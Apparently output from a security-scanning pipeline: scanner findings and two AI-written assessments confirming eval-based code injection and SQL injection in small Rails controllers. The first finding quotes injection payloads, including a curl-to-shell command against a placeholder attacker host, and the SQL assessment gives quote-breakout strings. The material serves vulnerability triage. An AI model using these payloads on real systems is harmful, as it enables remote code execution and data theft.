findings.title: OS command injection via unsanitized params[:dir] in system()
findings.description: The controller concatenates the attacker-controlled request parameter params[:dir] into a single command string passed to Kernel#system. Because the whole command is one shell string, Ruby invokes it through /bin/sh, so shell metacharacters are interpreted. A request such as ?dir=. ; id or ?dir=$(curl attacker.tld/x|sh) yields arbitrary command execution as the Rails process user.

findings.description: The name filter is built by interpolating params[:name] into a SQL fragment passed to User.where, which ActiveRecord treats as raw SQL. Contrast app/safe_view.erb, which uses plain <%= %>.

## Finding assessment: model-1a49f19ddea57d2b

**Verdict: confirmed, as a code-level vulnerability.** The scanner's description is slightly off on provenance, but the sink is real and unambiguous.

**Source code (complete file, 5 lines):**

```ruby
class CalcController < ApplicationController
  def compute
    render plain: eval(params[:expr])
  end
end
```

**Flow:** `params[:expr]` (attacker-controlled request parameter) is passed directly to `Kernel#eval` with no validation, allowlisting, or sandboxing. The result is rendered back to the client, which also gives the attacker a read-out channel for the return value of their expression.

**Why this is exploitable, not just theoretically bad:** Ruby's `eval` runs with the full privilege of the Rails process. An attacker-supplied string like a backtick or `system` call yields OS command execution, `File.read` yields arbitrary file disclosure (credentials, `config/master.key`, database config), and constant lookups reach loaded libraries and network sockets. There is no `$SAFE`/`RubyVM` guard here, and `$SAFE` is removed in modern Ruby anyway, so it would not have helped.

## Assessment: model-c2b6b14f556a90d7

**Confirmed vulnerable.** `app/vuln_sql.rb` is a 5-line file I read in full:

```ruby
class UsersController < ApplicationController
  def show
    @users = User.where("name = '#{params[:name]}'")   # line 3
  end
end
```

Line 3 interpolates `params[:name]` into a single-quoted SQL string literal passed to `User.where`. In Rails, `where` with a String argument is treated as raw SQL, not as a parameterized condition, so no placeholder binding occurs and no escaping is applied to the interpolated value. The safe counterpart `app/safe_sql.rb` line 3 uses `User.where(name: params[:name])`, which is the hash form and does bind the value -- confirming the difference is exactly the interpolation, not the framework.

Exploitation reasoning from the code: an attacker-supplied `params[:name]` such as `' OR '1'='1` breaks out of the quote and turns the predicate into a tautology, returning all rows; `' UNION SELECT ... --` appends an arbitrary result set. This is a classic quote-breakout injection, so no special escaping or edge case is required.

**Limitations of what I could verify this turn:**
- `lookup_route` returned only a note that lookups are served from the scan manifest; it produced no mapping for `UsersController`. There is no `routes.rb` or `web.xml` in the snapshot (`grep_code` for `routes` found nothing). So I cannot prove the action is reachable over HTTP from this snapshot -- reachability is inferred from it being an ApplicationController action named `show` reading `params`.
- Semgrep is not installed on this host (`semgrep not found on PATH`), and Ruby is not among the seven supported language families for CodeQL/Semgrep here. No independent static-analysis confirmation was possible; the finding rests on direct code reading plus the scanner's snippet, which matches what I read.
